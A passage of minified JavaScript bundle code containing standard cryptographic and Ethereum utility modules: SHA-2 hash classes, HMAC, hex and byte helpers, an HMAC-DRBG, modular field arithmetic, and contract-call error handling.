e.BaseError?a.walk(k=>"data"in k)||a.walk():{},{code:y,data:E,details:A,message:R,shortMessage:S}=w,v=a instanceof t.AbiDecodingZeroDataError?new n.ContractFunctionZeroDataError({functionName:m}):[s,i.InternalRpcError.code].includes(y)&&(E||A||R||S)||y===i.InvalidInputRpcError.code&&A==="execution reverted"&&E?new n.ContractFunctionRevertedError({abi:c,data:typeof E=="object"?E.data:E,functionName:m,message:w instanceof r.RpcRequestError?A:S??R}):a;return new n.ContractFunctionExecutionError(v,{abi:c,args:f,contractAddress:l,docsPath:h,functionName:m,sender:b})}return L6}var G6={},K6={},Z6={},Y6={},sY;function fle(){if(sY)return Y6;sY=1,Object.defineProperty(Y6,"__esModule",{value:!0}),Y6.publicKeyToAddress=n;const t=nc(),e=ha();function n(r){const i=(0,e.keccak256)(`0x${r.substring(4)}`).substring(26);return(0,t.checksumAddress)(`0x${i}`)}return Y6}var Q6={},GO={},hr={},zs={},oY;function hle(){if(oY)return zs;oY=1,Object.defineProperty(zs,"__esModule",{value:!0}),zs.SHA512_IV=zs.SHA384_IV=zs.SHA224_IV=zs.SHA256_IV=zs.HashMD=void 0,zs.setBigUint64=e,zs.Chi=n,zs.Maj=r;const t=i0();function e(s,o,a,c){if(typeof s.setBigUint64=="function")return s.setBigUint64(o,a,c);const l=BigInt(32),f=BigInt(4294967295),h=Number(a>>l&f),m=Number(a&f),b=c?4:0,w=c?0:4;s.setUint32(o+b,h,c),s.setUint32(o+w,m,c)}function n(s,o,a){return s&o^~s&a}function r(s,o,a){return s&o^s&a^o&a}class i extends t.Hash{constructor(o,a,c,l){super(),this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.blockLen=o,this.outputLen=a,this.padOffset=c,this.isLE=l,this.buffer=new Uint8Array(o),this.view=(0,t.createView)(this.buffer)}update(o){(0,t.aexists)(this),o=(0,t.toBytes)(o),(0,t.abytes)(o);const{view:a,buffer:c,blockLen:l}=this,f=o.length;for(let h=0;h<f;){const m=Math.min(l-this.pos,f-h);if(m===l){const b=(0,t.createView)(o);for(;l<=f-h;h+=l)this.process(b,h);continue}c.set(o.subarray(h,h+m),this.pos),this.pos+=m,h+=m,this.pos===l&&(this.process(a,0),this.pos=0)}return this.length+=o.length,this.roundClean(),this}digestInto(o){(0,t.aexists)(this),(0,t.aoutput)(o,this),this.finished=!0;const{buffer:a,view:c,blockLen:l,isLE:f}=this;let{pos:h}=this;a[h++]=128,(0,t.clean)(this.buffer.subarray(h)),this.padOffset>l-h&&(this.process(c,0),h=0);for(let E=h;E<l;E++)a[E]=0;e(c,l-8,BigInt(this.length*8),f),this.process(c,0);const m=(0,t.createView)(o),b=this.outputLen;if(b%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const w=b/4,y=this.get();if(w>y.length)throw new Error("_sha2: outputLen bigger than state");for(let E=0;E<w;E++)m.setUint32(4*E,y[E],f)}digest(){const{buffer:o,outputLen:a}=this;this.digestInto(o);const c=o.slice(0,a);return this.destroy(),c}_cloneInto(o){o||(o=new this.constructor),o.set(...this.get());const{blockLen:a,buffer:c,length:l,finished:f,destroyed:h,pos:m}=this;return o.destroyed=h,o.finished=f,o.length=l,o.pos=m,l%a&&o.buffer.set(c),o}clone(){return this._cloneInto()}}return zs.HashMD=i,zs.SHA256_IV=Uint32Array.from([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),zs.SHA224_IV=Uint32Array.from([3238371032,914150663,812702999,4144912697,4290775857,1750603025,1694076839,3204075428]),zs.SHA384_IV=Uint32Array.from([3418070365,3238371032,1654270250,914150663,2438529370,812702999,355462360,4144912697,1731405415,4290775857,2394180231,1750603025,3675008525,1694076839,1203062813,3204075428]),zs.SHA512_IV=Uint32Array.from([1779033703,4089235720,3144134277,2227873595,1013904242,4271175723,2773480762,1595750129,1359893119,2917565137,2600822924,725511199,528734635,4215389547,1541459225,327033209]),zs}var aY;function ple(){if(aY)return hr;aY=1,Object.defineProperty(hr,"__esModule",{value:!0}),hr.sha512_224=hr.sha512_256=hr.sha384=hr.sha512=hr.sha224=hr.sha256=hr.SHA512_256=hr.SHA512_224=hr.SHA384=hr.SHA512=hr.SHA224=hr.SHA256=void 0;const t=hle(),e=ale(),n=i0(),r=Uint32Array.from([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]),i=new Uint32Array(64);class s extends t.HashMD{constructor(S=32){super(64,S,8,!1),this.A=t.SHA256_IV[0]|0,this.B=t.SHA256_IV[1]|0,this.C=t.SHA256_IV[2]|0,this.D=t.SHA256_IV[3]|0,this.E=t.SHA256_IV[4]|0,this.F=t.SHA256_IV[5]|0,this.G=t.SHA256_IV[6]|0,this.H=t.SHA256_IV[7]|0}get(){const{A:S,B:v,C:k,D:O,E:_,F:I,G:T,H:B}=this;return[S,v,k,O,_,I,T,B]}set(S,v,k,O,_,I,T,B){this.A=S|0,this.B=v|0,this.C=k|0,this.D=O|0,this.E=_|0,this.F=I|0,this.G=T|0,this.H=B|0}process(S,v){for(let N=0;N<16;N++,v+=4)i[N]=S.getUint32(v,!1);for(let N=16;N<64;N++){const q=i[N-15],P=i[N-2],C=(0,n.rotr)(q,7)^(0,n.rotr)(q,18)^q>>>3,j=(0,n.rotr)(P,17)^(0,n.rotr)(P,19)^P>>>10;i[N]=j+i[N-7]+C+i[N-16]|0}let{A:k,B:O,C:_,D:I,E:T,F:B,G:U,H:M}=this;for(let N=0;N<64;N++){const q=(0,n.rotr)(T,6)^(0,n.rotr)(T,11)^(0,n.rotr)(T,25),P=M+q+(0,t.Chi)(T,B,U)+r[N]+i[N]|0,j=((0,n.rotr)(k,2)^(0,n.rotr)(k,13)^(0,n.rotr)(k,22))+(0,t.Maj)(k,O,_)|0;M=U,U=B,B=T,T=I+P|0,I=_,_=O,O=k,k=P+j|0}k=k+this.A|0,O=O+this.B|0,_=_+this.C|0,I=I+this.D|0,T=T+this.E|0,B=B+this.F|0,U=U+this.G|0,M=M+this.H|0,this.set(k,O,_,I,T,B,U,M)}roundClean(){(0,n.clean)(i)}destroy(){this.set(0,0,0,0,0,0,0,0),(0,n.clean)(this.buffer)}}hr.SHA256=s;class o extends s{constructor(){super(28),this.A=t.SHA224_IV[0]|0,this.B=t.SHA224_IV[1]|0,this.C=t.SHA224_IV[2]|0,this.D=t.SHA224_IV[3]|0,this.E=t.SHA224_IV[4]|0,this.F=t.SHA224_IV[5]|0,this.G=t.SHA224_IV[6]|0,this.H=t.SHA224_IV[7]|0}}hr.SHA224=o;const a=e.split(["0x428a2f98d728ae22","0x7137449123ef65cd","0xb5c0fbcfec4d3b2f","0xe9b5dba58189dbbc","0x3956c25bf348b538","0x59f111f1b605d019","0x923f82a4af194f9b","0xab1c5ed5da6d8118","0xd807aa98a3030242","0x12835b0145706fbe","0x243185be4ee4b28c","0x550c7dc3d5ffb4e2","0x72be5d74f27b896f","0x80deb1fe3b1696b1","0x9bdc06a725c71235","0xc19bf174cf692694","0xe49b69c19ef14ad2","0xefbe4786384f25e3","0x0fc19dc68b8cd5b5","0x240ca1cc77ac9c65","0x2de92c6f592b0275","0x4a7484aa6ea6e483","0x5cb0a9dcbd41fbd4","0x76f988da831153b5","0x983e5152ee66dfab","0xa831c66d2db43210","0xb00327c898fb213f","0xbf597fc7beef0ee4","0xc6e00bf33da88fc2","0xd5a79147930aa725","0x06ca6351e003826f","0x142929670a0e6e70","0x27b70a8546d22ffc","0x2e1b21385c26c926","0x4d2c6dfc5ac42aed","0x53380d139d95b3df","0x650a73548baf63de","0x766a0abb3c77b2a8","0x81c2c92e47edaee6","0x92722c851482353b","0xa2bfe8a14cf10364","0xa81a664bbc423001","0xc24b8b70d0f89791","0xc76c51a30654be30","0xd192e819d6ef5218","0xd69906245565a910","0xf40e35855771202a","0x106aa07032bbd1b8","0x19a4c116b8d2d0c8","0x1e376c085141ab53","0x2748774cdf8eeb99","0x34b0bcb5e19b48a8","0x391c0cb3c5c95a63","0x4ed8aa4ae3418acb","0x5b9cca4f7763e373","0x682e6ff3d6b2b8a3","0x748f82ee5defb2fc","0x78a5636f43172f60","0x84c87814a1f0ab72","0x8cc702081a6439ec","0x90befffa23631e28","0xa4506cebde82bde9","0xbef9a3f7b2c67915","0xc67178f2e372532b","0xca273eceea26619c","0xd186b8c721c0c207","0xeada7dd6cde0eb1e","0xf57d4f7fee6ed178","0x06f067aa72176fba","0x0a637dc5a2c898a6","0x113f9804bef90dae","0x1b710b35131c471b","0x28db77f523047d84","0x32caab7b40c72493","0x3c9ebe0a15c9bebc","0x431d67c49c100d4c","0x4cc5d4becb3e42b6","0x597f299cfc657e2a","0x5fcb6fab3ad6faec","0x6c44198c4a475817"].map(R=>BigInt(R))),c=a[0],l=a[1],f=new Uint32Array(80),h=new Uint32Array(80);class m extends t.HashMD{constructor(S=64){super(128,S,16,!1),this.Ah=t.SHA512_IV[0]|0,this.Al=t.SHA512_IV[1]|0,this.Bh=t.SHA512_IV[2]|0,this.Bl=t.SHA512_IV[3]|0,this.Ch=t.SHA512_IV[4]|0,this.Cl=t.SHA512_IV[5]|0,this.Dh=t.SHA512_IV[6]|0,this.Dl=t.SHA512_IV[7]|0,this.Eh=t.SHA512_IV[8]|0,this.El=t.SHA512_IV[9]|0,this.Fh=t.SHA512_IV[10]|0,this.Fl=t.SHA512_IV[11]|0,this.Gh=t.SHA512_IV[12]|0,this.Gl=t.SHA512_IV[13]|0,this.Hh=t.SHA512_IV[14]|0,this.Hl=t.SHA512_IV[15]|0}get(){const{Ah:S,Al:v,Bh:k,Bl:O,Ch:_,Cl:I,Dh:T,Dl:B,Eh:U,El:M,Fh:N,Fl:q,Gh:P,Gl:C,Hh:j,Hl:z}=this;return[S,v,k,O,_,I,T,B,U,M,N,q,P,C,j,z]}set(S,v,k,O,_,I,T,B,U,M,N,q,P,C,j,z){this.Ah=S|0,this.Al=v|0,this.Bh=k|0,this.Bl=O|0,this.Ch=_|0,this.Cl=I|0,this.Dh=T|0,this.Dl=B|0,this.Eh=U|0,this.El=M|0,this.Fh=N|0,this.Fl=q|0,this.Gh=P|0,this.Gl=C|0,this.Hh=j|0,this.Hl=z|0}process(S,v){for(let L=0;L<16;L++,v+=4)f[L]=S.getUint32(v),h[L]=S.getUint32(v+=4);for(let L=16;L<80;L++){const V=f[L-15]|0,G=h[L-15]|0,Z=e.rotrSH(V,G,1)^e.rotrSH(V,G,8)^e.shrSH(V,G,7),J=e.rotrSL(V,G,1)^e.rotrSL(V,G,8)^e.shrSL(V,G,7),ne=f[L-2]|0,re=h[L-2]|0,le=e.rotrSH(ne,re,19)^e.rotrBH(ne,re,61)^e.shrSH(ne,re,6),oe=e.rotrSL(ne,re,19)^e.rotrBL(ne,re,61)^e.shrSL(ne,re,6),ue=e.add4L(J,oe,h[L-7],h[L-16]),be=e.add4H(ue,Z,le,f[L-7],f[L-16]);f[L]=be|0,h[L]=ue|0}let{Ah:k,Al:O,Bh:_,Bl:I,Ch:T,Cl:B,Dh:U,Dl:M,Eh:N,El:q,Fh:P,Fl:C,Gh:j,Gl:z,Hh:$,Hl:H}=this;for(let L=0;L<80;L++){const V=e.rotrSH(N,q,14)^e.rotrSH(N,q,18)^e.rotrBH(N,q,41),G=e.rotrSL(N,q,14)^e.rotrSL(N,q,18)^e.rotrBL(N,q,41),Z=N&P^~N&j,J=q&C^~q&z,ne=e.add5L(H,G,J,l[L],h[L]),re=e.add5H(ne,$,V,Z,c[L],f[L]),le=ne|0,oe=e.rotrSH(k,O,28)^e.rotrBH(k,O,34)^e.rotrBH(k,O,39),ue=e.rotrSL(k,O,28)^e.rotrBL(k,O,34)^e.rotrBL(k,O,39),be=k&_^k&T^_&T,Me=O&I^O&B^I&B;$=j|0,H=z|0,j=P|0,z=C|0,P=N|0,C=q|0,{h:N,l:q}=e.add(U|0,M|0,re|0,le|0),U=T|0,M=B|0,T=_|0,B=I|0,_=k|0,I=O|0;const Te=e.add3L(le,ue,Me);k=e.add3H(Te,re,oe,be),O=Te|0}({h:k,l:O}=e.add(this.Ah|0,this.Al|0,k|0,O|0)),{h:_,l:I}=e.add(this.Bh|0,this.Bl|0,_|0,I|0),{h:T,l:B}=e.add(this.Ch|0,this.Cl|0,T|0,B|0),{h:U,l:M}=e.add(this.Dh|0,this.Dl|0,U|0,M|0),{h:N,l:q}=e.add(this.Eh|0,this.El|0,N|0,q|0),{h:P,l:C}=e.add(this.Fh|0,this.Fl|0,P|0,C|0),{h:j,l:z}=e.add(this.Gh|0,this.Gl|0,j|0,z|0),{h:$,l:H}=e.add(this.Hh|0,this.Hl|0,$|0,H|0),this.set(k,O,_,I,T,B,U,M,N,q,P,C,j,z,$,H)}roundClean(){(0,n.clean)(f,h)}destroy(){(0,n.clean)(this.buffer),this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)}}hr.SHA512=m;class b extends m{constructor(){super(48),this.Ah=t.SHA384_IV[0]|0,this.Al=t.SHA384_IV[1]|0,this.Bh=t.SHA384_IV[2]|0,this.Bl=t.SHA384_IV[3]|0,this.Ch=t.SHA384_IV[4]|0,this.Cl=t.SHA384_IV[5]|0,this.Dh=t.SHA384_IV[6]|0,this.Dl=t.SHA384_IV[7]|0,this.Eh=t.SHA384_IV[8]|0,this.El=t.SHA384_IV[9]|0,this.Fh=t.SHA384_IV[10]|0,this.Fl=t.SHA384_IV[11]|0,this.Gh=t.SHA384_IV[12]|0,this.Gl=t.SHA384_IV[13]|0,this.Hh=t.SHA384_IV[14]|0,this.Hl=t.SHA384_IV[15]|0}}hr.SHA384=b;const w=Uint32Array.from([2352822216,424955298,1944164710,2312950998,502970286,855612546,1738396948,1479516111,258812777,2077511080,2011393907,79989058,1067287976,1780299464,286451373,2446758561]),y=Uint32Array.from([573645204,4230739756,2673172387,3360449730,596883563,1867755857,2520282905,1497426621,2519219938,2827943907,3193839141,1401305490,721525244,746961066,246885852,2177182882]);class E extends m{constructor(){super(28),this.Ah=w[0]|0,this.Al=w[1]|0,this.Bh=w[2]|0,this.Bl=w[3]|0,this.Ch=w[4]|0,this.Cl=w[5]|0,this.Dh=w[6]|0,this.Dl=w[7]|0,this.Eh=w[8]|0,this.El=w[9]|0,this.Fh=w[10]|0,this.Fl=w[11]|0,this.Gh=w[12]|0,this.Gl=w[13]|0,this.Hh=w[14]|0,this.Hl=w[15]|0}}hr.SHA512_224=E;class A extends m{constructor(){super(32),this.Ah=y[0]|0,this.Al=y[1]|0,this.Bh=y[2]|0,this.Bl=y[3]|0,this.Ch=y[4]|0,this.Cl=y[5]|0,this.Dh=y[6]|0,this.Dl=y[7]|0,this.Eh=y[8]|0,this.El=y[9]|0,this.Fh=y[10]|0,this.Fl=y[11]|0,this.Gh=y[12]|0,this.Gl=y[13]|0,this.Hh=y[14]|0,this.Hl=y[15]|0}}return hr.SHA512_256=A,hr.sha256=(0,n.createHasher)(()=>new s),hr.sha224=(0,n.createHasher)(()=>new o),hr.sha512=(0,n.createHasher)(()=>new m),hr.sha384=(0,n.createHasher)(()=>new b),hr.sha512_256=(0,n.createHasher)(()=>new A),hr.sha512_224=(0,n.createHasher)(()=>new E),hr}var p2={},KO={},cY;function jFe(){return cY||(cY=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.hmac=t.HMAC=void 0;const e=i0();class n extends e.Hash{constructor(s,o){super(),this.finished=!1,this.destroyed=!1,(0,e.ahash)(s);const a=(0,e.toBytes)(o);if(this.iHash=s.create(),typeof this.iHash.update!="function")throw new Error("Expected instance of class which extends utils.Hash");this.blockLen=this.iHash.blockLen,this.outputLen=this.iHash.outputLen;const c=this.blockLen,l=new Uint8Array(c);l.set(a.length>c?s.create().update(a).digest():a);for(let f=0;f<l.length;f++)l[f]^=54;this.iHash.update(l),this.oHash=s.create();for(let f=0;f<l.length;f++)l[f]^=106;this.oHash.update(l),(0,e.clean)(l)}update(s){return(0,e.aexists)(this),this.iHash.update(s),this}digestInto(s){(0,e.aexists)(this),(0,e.abytes)(s,this.outputLen),this.finished=!0,this.iHash.digestInto(s),this.oHash.update(s),this.oHash.digestInto(s),this.destroy()}digest(){const s=new Uint8Array(this.oHash.outputLen);return this.digestInto(s),s}_cloneInto(s){s||(s=Object.create(Object.getPrototypeOf(this),{}));const{oHash:o,iHash:a,finished:c,destroyed:l,blockLen:f,outputLen:h}=this;return s=s,s.finished=c,s.destroyed=l,s.blockLen=f,s.outputLen=h,s.oHash=o._cloneInto(s.oHash),s.iHash=a._cloneInto(s.iHash),s}clone(){return this._cloneInto()}destroy(){this.destroyed=!0,this.oHash.destroy(),this.iHash.destroy()}}t.HMAC=n;const r=(i,s,o)=>new n(i,s).update(o).digest();t.hmac=r,t.hmac.create=(i,s)=>new n(i,s)})(KO)),KO}var ZO={},lm={},Nr={},qn={},uY;function cy(){if(uY)return qn;uY=1;Object.defineProperty(qn,"__esModule",{value:!0}),qn.notImplemented=qn.bitMask=void 0,qn.isBytes=n,qn.abytes=r,qn.abool=i,qn.numberToHexUnpadded=s,qn.hexToNumber=o,qn.bytesToHex=l,qn.hexToBytes=m,qn.bytesToNumberBE=b,qn.bytesToNumberLE=w,qn.numberToBytesBE=y,qn.numberToBytesLE=E,qn.numberToVarBytesBE=A,qn.ensureBytes=R,qn.concatBytes=S,qn.equalBytes=v,qn.utf8ToBytes=k,qn.inRange=_,qn.aInRange=I,qn.bitLen=T,qn.bitGet=B,qn.bitSet=U,qn.createHmacDrbg=P,qn.validateObject=j,qn.memoized=$;const t=BigInt(0),e=BigInt(1);function n(H){return H instanceof Uint8Array||ArrayBuffer.isView(H)&&H.constructor.name==="Uint8Array"}function r(H){if(!n(H))throw new Error("Uint8Array expected")}function i(H,L){if(typeof L!="boolean")throw new Error(H+" boolean expected, got "+L)}function s(H){const L=H.toString(16);return L.length&1?"0"+L:L}function o(H){if(typeof H!="string")throw new Error("hex string expected, got "+typeof H);return H===""?t:BigInt("0x"+H)}const a=typeof Uint8Array.from([]).toHex=="function"&&typeof Uint8Array.fromHex=="function",c=Array.from({length:256},(H,L)=>L.toString(16).padStart(2,"0"));function l(H){if(r(H),a)return H.toHex();let L="";for(let V=0;V<H.length;V++)L+=c[H[V]];return L}const f={_0:48,_9:57,A:65,F:70,a:97,f:102};function h(H){if(H>=f._0&&H<=f._9)return H-f._0;if(H>=f.A&&H<=f.F)return H-(f.A-10);if(H>=f.a&&H<=f.f)return H-(f.a-10)}function m(H){if(typeof H!="string")throw new Error("hex string expected, got "+typeof H);if(a)return Uint8Array.fromHex(H);const L=H.length,V=L/2;if(L%2)throw new Error("hex string expected, got unpadded hex of length "+L);const G=new Uint8Array(V);for(let Z=0,J=0;Z<V;Z++,J+=2){const ne=h(H.charCodeAt(J)),re=h(H.charCodeAt(J+1));if(ne===void 0||re===void 0){const le=H[J]+H[J+1];throw new Error('hex string expected, got non-hex character "'+le+'" at index '+J)}G[Z]=ne*16+re}return G}function b(H){return o(l(H))}function w(H){return r(H),o(l(Uint8Array.from(H).reverse()))}function y(H,L){return m(H.toString(16).padStart(L*2,"0"))}function E(H,L){return y(H,L).reverse()}function A(H){return m(s(H))}function R(H,L,V){let G;if(typeof L=="string")try{G=m(L)}catch(J){throw new Error(H+" must be hex string or Uint8Array, cause: "+J)}else if(n(L))G=Uint8Array.from(L);else throw new Error(H+" must be hex string or Uint8Array");const Z=G.length;if(typeof V=="number"&&Z!==V)throw new Error(H+" of length "+V+" expected, got "+Z);return G}function S(...H){let L=0;for(let G=0;G<H.length;G++){const Z=H[G];r(Z),L+=Z.length}const V=new Uint8Array(L);for(let G=0,Z=0;G<H.length;G++){const J=H[G];V.set(J,Z),Z+=J.length}return V}function v(H,L){if(H.length!==L.length)return!1;let V=0;for(let G=0;G<H.length;G++)V|=H[G]^L[G];return V===0}function k(H){if(typeof H!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(H))}const O=H=>typeof H=="bigint"&&t<=H;function _(H,L,V){return O(H)&&O(L)&&O(V)&&L<=H&&H<V}function I(H,L,V,G){if(!_(L,V,G))throw new Error("expected valid "+H+": "+V+" <= n < "+G+", got "+L)}function T(H){let L;for(L=0;H>t;H>>=e,L+=1);return L}function B(H,L){return H>>BigInt(L)&e}function U(H,L,V){return H|(V?e:t)<<BigInt(L)}const M=H=>(e<<BigInt(H))-e;qn.bitMask=M;const N=H=>new Uint8Array(H),q=H=>Uint8Array.from(H);function P(H,L,V){if(typeof H!="number"||H<2)throw new Error("hashLen must be a number");if(typeof L!="number"||L<2)throw new Error("qByteLen must be a number");if(typeof V!="function")throw new Error("hmacFn must be a function");let G=N(H),Z=N(H),J=0;const ne=()=>{G.fill(1),Z.fill(0),J=0},re=(...be)=>V(Z,G,...be),le=(be=N(0))=>{Z=re(q([0]),be),G=re(),be.length!==0&&(Z=re(q([1]),be),G=re())},oe=()=>{if(J++>=1e3)throw new Error("drbg: tried 1000 values");let be=0;const Me=[];for(;be<L;){G=re();const Te=G.slice();Me.push(Te),be+=G.length}return S(...Me)};return(be,Me)=>{ne(),le(be);let Te;for(;!(Te=Me(oe()));)le();return ne(),Te}}const C={bigint:H=>typeof H=="bigint",function:H=>typeof H=="function",boolean:H=>typeof H=="boolean",string:H=>typeof H=="string",stringOrUint8Array:H=>typeof H=="string"||n(H),isSafeInteger:H=>Number.isSafeInteger(H),array:H=>Array.isArray(H),field:(H,L)=>L.Fp.isValid(H),hash:H=>typeof H=="function"&&Number.isSafeInteger(H.outputLen)};function j(H,L,V={}){const G=(Z,J,ne)=>{const re=C[J];if(typeof re!="function")throw new Error("invalid validator function");const le=H[Z];if(!(ne&&le===void 0)&&!re(le,H))throw new Error("param "+String(Z)+" is invalid. Expected "+J+", got "+le)};for(const[Z,J]of Object.entries(L))G(Z,J,!1);for(const[Z,J]of Object.entries(V))G(Z,J,!0);return H}const z=()=>{throw new Error("not implemented")};qn.notImplemented=z;function $(H){const L=new WeakMap;return(V,...G)=>{const Z=L.get(V);if(Z!==void 0)return Z;const J=H(V,...G);return L.set(V,J),J}}return qn}var lY;function z8(){if(lY)return Nr;lY=1,Object.defineProperty(Nr,"__esModule",{value:!0}),Nr.isNegativeLE=void 0,Nr.mod=l,Nr.pow=f,Nr.pow2=h,Nr.invert=m,Nr.tonelliShanks=y,Nr.FpSqrt=E,Nr.validateField=S,Nr.FpPow=v,Nr.FpInvertBatch=k,Nr.FpDiv=O,Nr.FpLegendre=_,Nr.FpIsSquare=I,Nr.nLength=T,Nr.Field=B,Nr.FpSqrtOdd=U,Nr.FpSqrtEven=M,Nr.hashToPrivateScalar=N,Nr.getFieldBytesLength=q,Nr.getMinHashLength=P,Nr.mapHashToField=C;const t=i0(),e=cy(),n=BigInt(0),r=BigInt(1),i=BigInt(2),s=BigInt(3),o=BigInt(4),a=BigInt(5),c=BigInt(8);function l(j,z){const $=j%z;return $>=n?$:z+$}function f(j,z,$){return v(B($),j,z)}function h(j,z,$){let H=j;for(;z-- >n;)H*=H,H%=$;return H}function m(j,z){if(j===n)throw new Error("invert: expected non-zero number");if(z<=n)throw new Error("invert: expected positive modulus, got "+z);let $=l(j,z),H=z,L=n,V=r;for(;$!==n;){const Z=H/$,J=H%$,ne=L-V*Z;H=$,$=J,L=V,V=ne}if(H!==r)throw new Error("invert: does not exist");return l(L,z)}function b(j,z){const $=(j.ORDER+r)/o,H=j.pow(z,$);if(!j.eql(j.sqr(H),z))throw new Error("Cannot find square root");return H}function w(j,z){const $=(j.ORDER-a)/c,H=j.mul(z,i),L=j.pow(H,$),V=j.mul(z,L),G=j.mul(j.mul(V,i),L),Z=j.mul(V,j.sub(G,j.ONE));if(!j.eql(j.sqr(Z),z))throw new Error("Cannot find square root");return Z}function y(j){if(j<BigInt(3))throw new Error("sqrt is not defined for small field");let z=j-r,$=0;for(;z%i===n;)z/=i,$++;let H=i;const L=B(j);for(;_(L,H)===1;)if(H++>1e3)throw new Error("Cannot find square root: probably non-prime P");if($===1)return b;let V=L.pow(H,z);const G=(z+r)/i;return function(J,ne){if(J.is0(ne))return ne;if(_(J,ne)!==1)throw new Error("Cannot find square root");let re=$,le=J.mul(J.ONE,V),oe=J.pow(ne,z),ue=J.pow(ne,G);for(;!J.eql(oe,J.ONE);){if(J.is0(oe))return J.ZERO;let be=1,Me=J.sqr(oe);for(;!J.eql(Me,J.ONE);)if(be++,Me=J.sqr(Me),be===re)throw new Error("Cannot find square root");const Te=r<<BigInt(re-be-1),Oe=J.pow(le,Te);re=be,le=J.sqr(Oe),oe=J.mul(oe,le),ue=J.mul(ue,Oe)}return ue}}function E(j){return j%o===s?b:j%c===a?w:y(j)}const A=(j,z)=>(l(j,z)&r)===r;Nr.isNegativeLE=A;const R=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function S(j){const z={ORDER:"bigint",MASK:"bigint",BYTES:"isSafeInteger",BITS:"isSafeInteger"},$=R.reduce((H,L)=>(H[L]="function",H),z);return(0,e.validateObject)(j,$)}function v(j,z,$){if($<n)throw new Error("invalid exponent, negatives unsupported");if($===n)return j.ONE;if($===r)return z;let H=j.ONE,L=z;for(;$>n;)$&r&&(H=j.mul(H,L)),L=j.sqr(L),$>>=r;return H}function k(j,z,$=!1){const H=new Array(z.length).fill($?j.ZERO:void 0),L=z.reduce((G,Z,J)=>j.is0(Z)?G:(H[J]=G,j.mul(G,Z)),j.ONE),V=j.inv(L);return z.reduceRight((G,Z,J)=>j.is0(Z)?G:(H[J]=j.mul(G,H[J]),j.mul(G,Z)),V),H}function O(j,z,$){return j.mul(z,typeof $=="bigint"?m($,j.ORDER):j.inv($))}function _(j,z){const $=(j.ORDER-r)/i,H=j.pow(z,$),L=j.eql(H,j.ONE),V=j.eql(H,j.ZERO),G=j.eql(H,j.neg(j.ONE));if(!L&&!V&&!G)throw new Error("invalid Legendre symbol result");return L?1:V?0:-1}function I(j,z){return _(j,z)===1}function T(j,z){z!==void 0&&(0,t.anumber)(z);const $=z!==void 0?z:j.toString(2).length,H=Math.ceil($/8);return{nBitLength:$,nByteLength:H}}function B(j,z,$=!1,H={}){if(j<=n)throw new Error("invalid field: expected ORDER > 0, got "+j);const{nBitLength:L,nByteLength:V}=T(j,z);if(V>2048)throw new Error("invalid field: expected ORDER of <= 2048 bytes");let G;const Z=Object.freeze({ORDER:j,isLE:$,BITS:L,BYTES:V,MASK:(0,e.bitMask)(L),ZERO:n,ONE:r,create:J=>l(J,j),isValid:J=>{if(typeof J!="bigint")throw new Error("invalid field element: expected bigint, got "+typeof J);return n<=J&&J<j},is0:J=>J===n,isOdd:J=>(J&r)===r,neg:J=>l(-J,j),eql:(J,ne)=>J===ne,sqr:J=>l(J*J,j),add:(J,ne)=>l(J+ne,j),sub:(J,ne)=>l(J-ne,j),mul:(J,ne)=>l(J*ne,j),pow:(J,ne)=>v(Z,J,ne),div:(J,ne)=>l(J*m(ne,j),j),sqrN:J=>J*J,addN:(J,ne)=>J+ne,subN:(J,ne)=>J-ne,mulN:(J,ne)=>J*ne,inv:J=>m(J,j),sqrt:H.sqrt||(J=>(G||(G=E(j)),G(Z,J))),toBytes:J=>$?(0,e.numberToBytesLE)(J,V):(0,e.numberToBytesBE)(J,V),fromBytes:J=>{if(J.length!==V)throw new Error("Field.fromBytes: expected "+V+" bytes, got "+J.length);return $?(0,e.bytesToNumberLE)(J):(0,e.bytesToNumberBE)(J)},invertBatch:J=>k(Z,J),cmov:(J,ne,re)=>re?ne:J});return Object.freeze(Z)}function U(j,z){if(!j.isOdd)throw new Error("Field doesn't have isOdd");const $=j.sqrt(z);return j.isOdd($)?$:j.neg($)}function M(j,z){if(!j.isOdd)throw new Error("Field doesn't have isOdd");const $=j.sqrt(z);return j.isOdd($)?j.neg($):$}function N(j,z,$=!1){j=(0,e.ensureBytes)("privateHash",j);const H=j.length,L=T(z).nByteLength+8;if(L<24||H<L||H>1024)throw new Error("hashToPrivateScalar: expected "+L+"-1024 bytes of input, got "+H);const V=$?(0,e.bytesToNumberLE)(j):(0,e.bytesToNumberBE)(j);return l(V,z-r)+r}function q(j){if(typeof j!="bigint")throw new Error("field order must be bigint");const z=j.toString(2).length;return Math.ceil(z/8)}function P(j){const z=q(j);return z+Math.ceil(z/2)}function C(j,z,$=!1){const H=j.length,L=q(z),V=P(z);if(H<16||H<V||H>1024)throw new Error("expected "+V+"-1024 bytes of input, got "+H);const G=$?(0,e.bytesToNumberLE)(j):(0,e.bytesToNumberBE)(j),Z=l(G,z-r)+r;return $?(0,e.numberToBytesLE)(Z,L):(0,e.numberToBytesBE)(Z,L)}return Nr}var dY;function MFe(){if(dY)return lm;dY=1,Object.defineProperty(lm,"__esModule",{value:!0}),lm.wNAF=b,lm.pippenger=w,lm.precomputeMSMUnsafe=y,lm.validateBasic=E;const t=z8(),e=cy(),n=BigInt(0),r=BigInt(1);function i(A,R){const S=R.negate();return A?S:R}function s(A,R){if(!Number.isSafeInteger(A)||A<=0||A>R)throw new Error("invalid window size, expected [1.."+R+"], got W="+A)}function o(A,R){s(A,R);const S=Math.ceil(R/A)+1,v=2**(A-1),k=2**A,O=(0,e.bitMask)(A),_=BigInt(A);return{windows:S,windowSize:v,mask:O,maxNumber:k,shiftBy:_}}function 